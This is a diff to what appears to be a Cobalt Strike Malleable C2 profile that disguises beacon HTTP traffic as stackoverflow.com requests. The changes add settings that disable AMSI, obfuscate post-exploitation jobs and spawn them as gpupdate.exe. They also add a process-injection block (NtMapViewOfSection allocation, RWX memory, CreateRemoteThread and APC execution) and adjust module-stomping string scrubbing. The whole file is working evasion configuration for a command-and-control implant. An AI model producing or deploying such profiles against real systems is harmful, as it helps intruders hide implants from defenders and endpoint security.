@@ -11,9 +11,19 @@ set maxdns    "245";
 set sample_name "stackoverflow.profile";
 
 #https-certificate {
-#	set keystore "your_store_file.store";
-#	set password "your_store_pass";
+#    set keystore "your_store_file.store";
+#    set password "your_store_pass";
 #}
+
+http-config {
+#    set headers "Server, Content-Type, Cache-Control, Connection";
+#    header "Content-Type" "text/html;charset=UTF-8";
+#    header "Connection" "close";
+#    header "Cache-Control" "max-age=2";
+#    header "Server" "nginx";
+    #set "true" if teamserver is behind redirector
+    set trust_x_forwarded_for "false";
+}
 
 http-get {
 
@@ -21,8 +31,8 @@ http-get {
     
     client {
 
-#	header "Host" "stackoverflow.com";
-	header "Accept" "*/*";
+#        header "Host" "stackoverflow.com";
+        header "Accept" "*/*";
 	header "Accept-Language" "en-US";
 #	header "Connection" "close";
 	
@@ -43,7 +53,7 @@ http-get {
 
     server {
 
-	header "Cache-control" "private";
+        header "Cache-control" "private";
 	header "Content-Type" "text/html; charset=utf-8";
 	header "X-Frame-Origins" "SAMEORIGIN";
 	header "Age" "0";
@@ -86,8 +96,8 @@ http-post {
 
     client {
 
-#	header "Host" "stackoverflow.com";
-	header "Accept" "*/*";
+#        header "Host" "stackoverflow.com";
+        header "Accept" "*/*";
 	header "Accept-Language" "en";
 #	header "Connection" "close";     
         
@@ -114,7 +124,7 @@ http-post {
 
     server {
 
-	header "Cache-control" "private";
+        header "Cache-control" "private";
 	header "Content-Type" "text/html; charset=utf-8";
 	header "X-Frame-Origins" "SAMEORIGIN";
 	header "Strict-Transport-Security" "max-age=15552000";
@@ -181,8 +191,18 @@ http-stager {
 ###Malleable PE Options###
 #always test spawnto and module stomp before using. My examples tested on Windows 10 Pro.
 
-set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
-set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+post-ex {
+
+    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
+    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+
+    set obfuscate "true";
+
+    set smartinject "true";
+
+    set amsi_disable "true";
+
+}
 
 #used peclone on wwanmm.dll. 
 #don't use 'set image_size_xx' if using 'set module_xx'
@@ -203,7 +223,7 @@ stage {
 
 #module stomp
 
-	set module_x86 "wwanmm.dll";
+        set module_x86 "wwanmm.dll";
 	set module_x64 "wwanmm.dll";
 
 	transform-x86 {
@@ -215,6 +235,31 @@ stage {
 	transform-x64 {
 	    prepend "\x90\x90\x90";
 	    strrep "ReflectiveLoader" "";
-	    strrep "beacon.64.dll" "";
+	    strrep "beacon.x64.dll" "";
 	}
+}
+process-inject {
+
+    set allocator "NtMapViewOfSection";		
+
+    set min_alloc "16700";
+
+    set userwx "false";  
+    
+    set startrwx "true";
+        
+    transform-x86 {
+        prepend "\x90\x90\x90";
+    }
+    transform-x64 {
+        prepend "\x90\x90\x90";
+    }
+
+    execute {
+        CreateThread "ntdll!RtlUserThreadStart";
+        CreateThread;
+        NtQueueApcThread;
+        CreateRemoteThread;
+        RtlCreateUserThread;
+    }
 }
